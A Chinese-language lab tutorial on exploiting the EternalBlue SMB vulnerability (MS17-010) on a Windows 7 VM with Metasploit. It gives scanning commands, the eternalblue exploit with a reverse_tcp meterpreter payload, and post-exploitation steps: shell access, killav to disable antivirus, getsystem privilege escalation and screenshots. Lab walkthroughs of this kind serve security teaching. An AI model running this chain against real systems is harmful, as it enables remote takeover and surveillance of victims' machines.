## 简介

永恒之蓝是指2017年4月14日晚，黑客团体Shadow
Brokers（影子经纪人）公布一大批网络攻击工具，其中包含“永恒之蓝”工具，“永恒之蓝”利用Windows系统的SMB漏洞可以获取系统最高权限。  
2017年5月12日，不法分子通>过改造“永恒之蓝”制作了wannacry勒索病毒，英国、俄罗斯、整个欧洲以及中国国内多个高校校内网、大型企业内网和政府机构专网中招，被勒索支付高额赎金才能解密恢复文件。

## 环境

攻击机：kalilinux

靶机：win7x64

同一局域网下

攻击机ip：192.168.169.139

靶机ip：192.168.169.130

关闭靶机的防火墙并确保445端口打开

## 开始攻击

### 01打开metasploit工具

msfconsole

进入metasploit框架

![](https://image.3001.net/images/20220321/1647868722_62387b32d664d4dd755d4.png!small)

### 02搜寻永恒之蓝漏洞

search ms17-010

![](https://image.3001.net/images/20220321/1647868726_62387b36759283f69c773.png!small)

### 03使用辅助模块

  * 1.使用辅助模块
    * `use auxiliary/scanner/smb/smb_ms17_010`
  * 2.查看漏洞需要的配置
    * `show options`

![](https://image.3001.net/images/20220321/1647868730_62387b3ae138603d3e97d.png!small)

由此可知永恒之蓝漏洞使用SMB服务攻击和445端口进行攻击

3.探测某ip范围内是有否存在该漏洞的主机  
`set RHOST 192.168.169.120-192.168.169.140`  
`exploit`

![](https://image.3001.net/images/20220321/1647868736_62387b404d93ac5e4af1e.png!small)

图中带[+]符号表示该主机192.168.169.130存在此漏洞（正是我们的靶机win7）

### 04使用漏洞模块

use exploit/windows/smb/ms17_010_eternalblue

查看攻击载荷payloads  
`show payloads`

![](https://image.3001.net/images/20220321/1647868744_62387b4836b4c85a28cc2.png!small)

查看漏洞的详细(全部)信息  
`info`

![](https://image.3001.net/images/20220321/1647868754_62387b523dc31a1e3b164.png!small)

#### 设置攻击载荷

set payload windows/x64/meterpreter/reverse_tcp

#### 攻击靶机

set rhost 192.168.169.130

#### 监听端

set lhost 192.168.169.139

![](https://image.3001.net/images/20220321/1647868760_62387b58a45b6e376a24e.png!small)

### 运行

run

![](https://image.3001.net/images/20220321/1647868766_62387b5ef2d7d02a1aac7.png!small)![](https://image.3001.net/images/20220321/1647868773_62387b65e8d7be6eddd6b.png!small)

出现 meterpreter即为成功

## 演示

### 进入终端

shell

![](https://image.3001.net/images/20220321/1647868775_62387b6755e18353211fd.png!small)

### 打开计算机

calc

![](https://image.3001.net/images/20220321/1647868776_62387b68086ea87fa7525.png!small)

###
![1647868692_62387b148fc3f16fd2784.png!small?1647868692890](https://image.3001.net/images/20220321/1647868692_62387b148fc3f16fd2784.png!small?1647868692890)

### 查看主机信息

sysinfo

![](https://image.3001.net/images/20220321/1647868776_62387b68a991e05854399.png!small)

### 查看主机是否运行在虚拟机上

run post/windows/gather/checkvm

![](https://image.3001.net/images/20220321/1647868777_62387b697806064f070f9.png!small)

### 关闭杀毒软件

run killav

![](https://image.3001.net/images/20220321/1647868778_62387b6a3d14df00b4659.png!small)

### 提升权限

getsystem

![](https://image.3001.net/images/20220321/1647868779_62387b6b0d67c27b0cbcb.png!small)

### 截屏

screenshot

![](https://image.3001.net/images/20220321/1647868779_62387b6ba1d5214662338.png!small)

![1647868639_62387adfe721eeece7e78.png!small?1647868640534](https://image.3001.net/images/20220321/1647868639_62387adfe721eeece7e78.png!small?1647868640534)

